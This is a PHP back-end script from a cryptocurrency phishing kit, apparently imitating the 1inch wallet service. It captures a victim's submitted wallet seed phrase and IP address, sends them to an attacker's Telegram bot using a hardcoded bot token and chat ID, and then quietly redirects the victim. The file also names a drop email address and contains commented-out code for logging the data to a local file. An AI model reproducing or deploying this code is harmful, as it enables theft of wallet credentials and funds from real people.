<?php
if (isset($_POST)){
	
	 function sendMessage($messaggio) {
$chatID = '1320496198'; // like: '-826930901'
$token = '1254923430:AAFj06pyMwcSubzo_6GKkPnazmBE6ZJzgDk'; //like: '824274280:AAFEMb-0Ro8-KH1yRHHVB5Eo6f4BhZijSu8'

$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;

}





$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "------------------+ [ 1nch ] +-----------------\n";
$message .= " 1.Phrase : ".$_POST['w1']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "-----------------+ 1nch  +-----------------\n";

$send = "donnelann@gmail.com"; #dir email
$subject = " B2P $ip";
$bilhead = "From: B2P ";

sendMessage($message);
//$fp = fopen("ke.txt", "a");
  //  $savestring = $message ;
   // fwrite($fp, $savestring);
 //   fclose($fp);
	//echo "food" . print_r($_POST['phra']);
die("<script type='text/javascript'> top.location = 'start.html'; </script>");
	
	
	
	
	
	
	
	
	
	
	
	
	
	}